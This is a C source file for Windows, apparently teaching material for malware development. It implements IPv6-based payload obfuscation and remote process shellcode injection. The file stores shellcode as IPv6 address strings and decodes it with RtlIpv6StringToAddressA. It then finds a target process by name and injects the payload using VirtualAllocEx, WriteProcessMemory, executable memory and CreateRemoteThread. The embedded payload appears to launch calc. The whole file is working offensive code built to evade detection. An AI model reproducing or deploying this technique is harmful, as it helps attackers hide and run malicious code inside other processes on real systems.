#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>



char* Ipv6Array[] = {
		"FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
		"AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",
		"8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",
		"8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
		"595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B", "6F87:FFD5:BBE0:1D2A:0A41:BAA6:95BD:9DFF",
		"D548:83C4:283C:067C:0A80:FBE0:7505:BB47", "1372:6F6A:0059:4189:DAFF:D563:616C:6300"
};

#define NumberOfElements 17


typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
	PCSTR                   S,
	PCSTR* Terminator,
	PVOID                   Addr
	);


BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE pBuffer = NULL;
	PBYTE TmpBuffer = NULL;

	SIZE_T sBuffSize = NULL;

	PCSTR Terminator = NULL;

	NTSTATUS STATUS = NULL;

	// Getting the RtlIpv6StringToAddressA function's base address from ntdll.dll
	fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
	if (pRtlIpv6StringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// Getting the size of the shellcode (number of elements * 16)
	sBuffSize = NmbrOfElements * 16;
	// Allocating memory that will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;

	for (int i = 0; i < NmbrOfElements; i++) {

		if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
			printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv6Array[i], STATUS);
			return FALSE;
		}

		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;
	return TRUE;
}

BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	HANDLE hSnapShot = NULL;
	PROCESSENTRY32	Proc = { .dwSize = sizeof(PROCESSENTRY32) };

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {

			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		if (wcscmp(LowerName, szProcessName) == 0) {
			*dwProcessId = Proc.th32ProcessID;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

	} while (Process32Next(hSnapShot, &Proc));



_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sShellcodeSize) {

	PVOID pShellcodeAddress = NULL;
	SIZE_T sNumberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;

	// Allocate memory in the remote process
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Write the shellcode in the allocated memory
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sShellcodeSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sShellcodeSize) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memset(pShellcode, '\0', sShellcodeSize);

	// Make the memory region executable
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;

}

int wmain(int argc, wchar_t* argv[]) {

	HANDLE hProcess = NULL;
	DWORD dwProcessId = NULL;
	PBYTE pDeobfuscatedPayload = NULL;
	SIZE_T sDeobfuscatedSize = NULL;

	if (argc < 2) {
		wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
		return -1;
	}

	if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}

	if (!Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
		return -1;
	}

	if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize)) {
		return -1;
	}


	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
	CloseHandle(hProcess);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	return 0;
}